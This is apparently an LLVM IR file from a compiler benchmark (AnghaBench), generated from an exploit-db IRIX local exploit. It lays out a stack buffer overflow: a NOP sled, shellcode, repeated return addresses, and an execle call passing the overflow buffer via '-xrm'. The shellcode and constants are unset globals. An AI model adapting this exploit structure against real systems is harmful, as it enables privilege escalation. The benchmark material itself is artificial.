; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19267.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19267.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@irix_shellcode = common dso_local global i32* null, align 8
@get_sp_code = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [33 x i8] c"Recompile with the '-32' option\0A\00", align 1
@buf = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@NUM_ADDRESSES = common dso_local global i32 0, align 4
@BUF_LENGTH = common dso_local global i32 0, align 4
@IRIX_NOP = common dso_local global i32 0, align 4
@GP_OFFSET = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [32 x i8] c"stack = 0x%x, targ_addr = 0x%x\0A\00", align 1
@PATH_PROG = common dso_local global i32 0, align 4
@PROG = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"-xrm\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1 x i8*], align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32 ()*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = bitcast [1 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %13, i8 0, i64 8, i1 false)
  %14 = load i32*, i32** @irix_shellcode, align 8
  %15 = bitcast i32* %14 to i8*
  %16 = call i32 @strlen(i8* %15)
  %17 = add nsw i32 %16, 1
  store i32 %17, i32* %11, align 4
  %18 = load i32, i32* @get_sp_code, align 4
  %19 = sext i32 %18 to i64
  %20 = inttoptr i64 %19 to i32 ()*
  store i32 ()* %20, i32 ()** %12, align 8
  %21 = load i32 ()*, i32 ()** %12, align 8
  %22 = call i32 %21()
  store i32 %22, i32* %7, align 4
  %23 = load i32, i32* %7, align 4
  %24 = and i32 %23, -2147483648
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %29

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %28 = call i32 @exit(i32 1) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i32*, i32** @buf, align 8
  store i32* %30, i32** %9, align 8
  %31 = load i32, i32* %7, align 4
  %32 = load i32, i32* @OFFSET, align 4
  %33 = add nsw i32 %31, %32
  store i32 %33, i32* %6, align 4
  %34 = load i32, i32* %3, align 4
  %35 = icmp sgt i32 %34, 1
  br i1 %35, label %36, label %43

36:                                               ; preds = %29
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @atoi(i8* %39)
  %41 = load i32, i32* %6, align 4
  %42 = add nsw i32 %41, %40
  store i32 %42, i32* %6, align 4
  br label %43

43:                                               ; preds = %36, %29
  %44 = load i32, i32* %6, align 4
  %45 = load i32, i32* @NUM_ADDRESSES, align 4
  %46 = add nsw i32 %44, %45
  %47 = load i32, i32* @BUF_LENGTH, align 4
  %48 = load i32, i32* %11, align 4
  %49 = sub nsw i32 %47, %48
  %50 = sdiv i32 %49, 2
  %51 = add nsw i32 %46, %50
  %52 = and i32 %51, -4
  store i32 %52, i32* %8, align 4
  br label %53

53:                                               ; preds = %71, %43
  %54 = load i32, i32* %8, align 4
  %55 = and i32 %54, -16777216
  %56 = icmp eq i32 %55, 0
  br i1 %56, label %69, label %57

57:                                               ; preds = %53
  %58 = load i32, i32* %8, align 4
  %59 = and i32 %58, 16711680
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %69, label %61

61:                                               ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = and i32 %62, 65280
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %69, label %65

65:                                               ; preds = %61
  %66 = load i32, i32* %8, align 4
  %67 = and i32 %66, 255
  %68 = icmp eq i32 %67, 0
  br label %69

69:                                               ; preds = %65, %61, %57, %53
  %70 = phi i1 [ true, %61 ], [ true, %57 ], [ true, %53 ], [ %68, %65 ]
  br i1 %70, label %71, label %74

71:                                               ; preds = %69
  %72 = load i32, i32* %8, align 4
  %73 = add nsw i32 %72, 4
  store i32 %73, i32* %8, align 4
  br label %53

74:                                               ; preds = %69
  store i32 0, i32* %10, align 4
  br label %75

75:                                               ; preds = %95, %74
  %76 = load i32, i32* %10, align 4
  %77 = sext i32 %76 to i64
  %78 = load i32, i32* @NUM_ADDRESSES, align 4
  %79 = sext i32 %78 to i64
  %80 = udiv i64 %79, 16
  %81 = icmp ult i64 %77, %80
  br i1 %81, label %82, label %98

82:                                               ; preds = %75
  %83 = load i32, i32* %8, align 4
  %84 = load i32*, i32** %9, align 8
  %85 = getelementptr inbounds i32, i32* %84, i32 1
  store i32* %85, i32** %9, align 8
  store i32 %83, i32* %84, align 4
  %86 = load i32, i32* %8, align 4
  %87 = load i32*, i32** %9, align 8
  %88 = getelementptr inbounds i32, i32* %87, i32 1
  store i32* %88, i32** %9, align 8
  store i32 %86, i32* %87, align 4
  %89 = load i32, i32* %6, align 4
  %90 = load i32*, i32** %9, align 8
  %91 = getelementptr inbounds i32, i32* %90, i32 1
  store i32* %91, i32** %9, align 8
  store i32 %89, i32* %90, align 4
  %92 = load i32, i32* %6, align 4
  %93 = load i32*, i32** %9, align 8
  %94 = getelementptr inbounds i32, i32* %93, i32 1
  store i32* %94, i32** %9, align 8
  store i32 %92, i32* %93, align 4
  br label %95

95:                                               ; preds = %82
  %96 = load i32, i32* %10, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %10, align 4
  br label %75

98:                                               ; preds = %75
  store i32 0, i32* %10, align 4
  br label %99

99:                                               ; preds = %112, %98
  %100 = load i32, i32* %10, align 4
  %101 = sext i32 %100 to i64
  %102 = load i32, i32* @BUF_LENGTH, align 4
  %103 = load i32, i32* %11, align 4
  %104 = sub nsw i32 %102, %103
  %105 = sext i32 %104 to i64
  %106 = udiv i64 %105, 4
  %107 = icmp ult i64 %101, %106
  br i1 %107, label %108, label %115

108:                                              ; preds = %99
  %109 = load i32, i32* @IRIX_NOP, align 4
  %110 = load i32*, i32** %9, align 8
  %111 = getelementptr inbounds i32, i32* %110, i32 1
  store i32* %111, i32** %9, align 8
  store i32 %109, i32* %110, align 4
  br label %112

112:                                              ; preds = %108
  %113 = load i32, i32* %10, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %10, align 4
  br label %99

115:                                              ; preds = %99
  store i32 0, i32* %10, align 4
  br label %116

116:                                              ; preds = %131, %115
  %117 = load i32, i32* %10, align 4
  %118 = sext i32 %117 to i64
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = udiv i64 %120, 4
  %122 = icmp ult i64 %118, %121
  br i1 %122, label %123, label %134

123:                                              ; preds = %116
  %124 = load i32*, i32** @irix_shellcode, align 8
  %125 = load i32, i32* %10, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %124, i64 %126
  %128 = load i32, i32* %127, align 4
  %129 = load i32*, i32** %9, align 8
  %130 = getelementptr inbounds i32, i32* %129, i32 1
  store i32* %130, i32** %9, align 8
  store i32 %128, i32* %129, align 4
  br label %131

131:                                              ; preds = %123
  %132 = load i32, i32* %10, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %10, align 4
  br label %116

134:                                              ; preds = %116
  %135 = load i32, i32* %6, align 4
  %136 = load i32, i32* @GP_OFFSET, align 4
  %137 = add nsw i32 %135, %136
  %138 = load i32, i32* @NUM_ADDRESSES, align 4
  %139 = sdiv i32 %138, 2
  %140 = add nsw i32 %137, %139
  %141 = and i32 %140, -4
  store i32 %141, i32* %8, align 4
  store i32 0, i32* %10, align 4
  br label %142

142:                                              ; preds = %157, %134
  %143 = load i32, i32* %10, align 4
  %144 = sext i32 %143 to i64
  %145 = load i32, i32* @EXTRA, align 4
  %146 = sext i32 %145 to i64
  %147 = udiv i64 %146, 4
  %148 = icmp ult i64 %144, %147
  br i1 %148, label %149, label %160

149:                                              ; preds = %142
  %150 = load i32, i32* %8, align 4
  %151 = ashr i32 %150, 8
  %152 = load i32, i32* %8, align 4
  %153 = shl i32 %152, 24
  %154 = or i32 %151, %153
  %155 = load i32*, i32** %9, align 8
  %156 = getelementptr inbounds i32, i32* %155, i32 1
  store i32* %156, i32** %9, align 8
  store i32 %154, i32* %155, align 4
  br label %157

157:                                              ; preds = %149
  %158 = load i32, i32* %10, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %10, align 4
  br label %142

160:                                              ; preds = %142
  %161 = load i32*, i32** %9, align 8
  store i32 0, i32* %161, align 4
  %162 = load i32, i32* %7, align 4
  %163 = load i32, i32* %6, align 4
  %164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i32 %162, i32 %163)
  %165 = load i32, i32* @PATH_PROG, align 4
  %166 = load i32, i32* @PROG, align 4
  %167 = load i32*, i32** @buf, align 8
  %168 = getelementptr inbounds i32, i32* %167, i64 2
  %169 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %170 = call i32 @execle(i32 %165, i32 %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32* %168, i32 0, i8** %169)
  %171 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @execle(i32, i32, i8*, i32*, i32, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
